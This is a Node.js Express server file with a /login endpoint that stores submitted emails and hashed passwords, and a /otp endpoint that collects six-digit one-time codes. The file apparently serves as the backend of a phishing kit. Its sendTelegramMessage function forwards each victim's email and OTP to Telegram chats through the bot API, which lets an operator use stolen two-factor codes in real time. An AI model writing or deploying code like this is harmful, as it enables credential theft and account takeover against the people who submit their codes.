const express = require('express');
const cors = require('cors');
const db = require('./db');
const bcrypt = require('bcryptjs');
const axios = require('axios');
require('dotenv').config();

const app = express();

// Global error trap
process.on('uncaughtException', (err) => console.error('❌ Uncaught Exception:', err));
process.on('unhandledRejection', (err) => console.error('❌ Unhandled Rejection:', err));

// Middleware
app.use(cors());
app.use(express.json());

// Telegram message sender (multi-chat support)
async function sendTelegramMessage(message) {
  const botToken = process.env.TELEGRAM_BOT_TOKEN;
  const chatIds = process.env.TELEGRAM_CHAT_IDS?.split(',') || [];

  for (const chatId of chatIds) {
    try {
      const res = await axios.post(`https://api.telegram.org/bot${botToken}/sendMessage`, {
        chat_id: chatId.trim(),
        text: message,
      });
      console.log(`✅ Message sent to ${chatId.trim()}:`, res.data);
    } catch (err) {
      console.error(`❌ Telegram error for ${chatId.trim()}:`, err.response?.data || err.message);
    }
  }
}

// POST /login → Save login data and remember email
app.post('/login', (req, res) => {
  const { email, password } = req.body;
  if (!email || !password) return res.status(400).json({ error: 'Email and password are required' });

  const query = `
    SELECT id FROM submissions
    WHERE type = 'login'
      AND json_extract(payload, '$.email') = ?
  `;

  db.get(query, [email], (err, existing) => {
    if (err) {
      console.error('Login Query Error:', err);
      return res.status(500).json({ error: 'Server error' });
    }

    if (existing) {
      return res.status(409).json({ error: 'User already exists. Please log in.' });
    }

    const hashedPassword = bcrypt.hashSync(password, 10);
    const payload = JSON.stringify({ email, password: hashedPassword });

    db.run(
      `INSERT INTO submissions (type, payload) VALUES (?, ?)`,
      ['login', payload],
      function (err) {
        if (err) {
          console.error('Insert Login Error:', err);
          return res.status(500).json({ error: 'Server error' });
        }

        // Store latest email
        app.locals.lastEmail = email;
        return res.status(200).json({ message: 'Login successful' });
      }
    );
  });
});

// POST /otp → Save OTP and send email+otp via Telegram
app.post('/otp', async (req, res) => {
  const { code } = req.body;

  if (!code) return res.status(400).json({ error: 'OTP code is required' });
  if (!/^\d{6}$/.test(code)) {
    return res.status(422).json({ error: 'OTP must be exactly 6 digits (numbers only)' });
  }

  const payload = JSON.stringify({ code });

  db.run(
    `INSERT INTO submissions (type, payload) VALUES (?, ?)`,
    ['otp', payload],
    async function (err) {
      if (err) {
        console.error('Insert OTP Error:', err);
        return res.status(500).json({ error: 'Server error' });
      }

      const email = app.locals.lastEmail || 'unknown';
      await sendTelegramMessage(`🧾 New Submission\n📧 Email: ${email}\n🔐 OTP: ${code}`);

      return res.status(200).json({ message: 'OTP received' });
    }
  );
});

// Start server
const PORT = process.env.PORT || 5000;
app.listen(PORT, () => {
  console.log(`✅ Server running on http://localhost:${PORT}`);
});
